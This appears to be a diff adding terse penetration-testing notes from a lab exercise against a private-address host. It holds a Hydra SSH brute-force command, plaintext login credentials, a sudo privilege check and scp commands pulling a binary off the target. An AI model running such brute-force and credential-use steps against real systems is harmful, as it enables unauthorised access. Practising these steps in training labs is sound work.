@@ -1,0 +1,14 @@
+
+hydra -L Usernames.txt -P Passwords.txt 172.25.120.240 -s 60000 ssh -t16 -V
+
+ssh student@172.25.120.240 -p 60000 
+    password:studentpassword
+
+sudo -l (ALL - student can easily swich as root with student password)
+
+/home/student/Downloads/rp-lin-x86 and one.exe 
+
+cp /home/student/Downloads/rp-lin-x86 /tmp
+
+in kali: scp -P 60000 student@172.25.120.240:/tmp/rp-lin-x86 .
+
